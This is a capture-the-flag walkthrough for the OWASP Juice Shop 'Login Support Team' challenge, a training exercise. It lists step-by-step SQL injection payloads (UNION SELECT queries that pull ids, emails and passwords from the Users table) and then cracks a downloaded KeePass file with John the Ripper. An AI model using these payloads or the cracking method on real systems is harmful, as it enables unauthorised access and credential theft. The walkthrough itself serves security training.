## Login Support Team
### Challenge: Log in with the support team's original user credentials without applying SQL Injection or any other bypass.

1. Return to the `/rest/products/search?q=` endpoint.
2. Enter `'))--` to verify injection.
3. Enter `')) UNION SELECT * FROM Users--` to verfiy error `SQLITE_ERROR: SELECTs to the left and right of UNION do not have the same number of result columns` and confirm table name.
4. With trial and error find out correct number of columns to be 9 with `')) UNION SELECT '1', '2', '3', '4', '5', '6', '7', '8', '9' FROM Users--`.
5. Get rid of product results with `qwert')) UNION SELECT '1', '2', '3', '4', '5', '6', '7', '8', '9' FROM Users--`.
6. Replace the fixed values with correct column names, `qwert')) UNION SELECT id, email, password, '4', '5', '6', '7', '8', '9' FROM Users--`.
7. Extract the support team’s email address as `support@juice-sh.op`.
8. Visit the ftp folder.
9. Download the `incident-support.kdbx` file.
10. Download and install KeePass 2.x from http://keepass.info
11. Use `John the Ripper` to brute force the password from the `incident-support.kdbx` file.
12. Find the password for the support team user account in the prod entry of the KeePass file.
13. Right click this entry and select `Copy Password`.
14. Return to `Account > Login` in the web application.
15. Enter `support@juice-sh.op` in the email input.
16. Paste the password from KeePass in the password input.
17. Click `Log in` to solve this challenge.
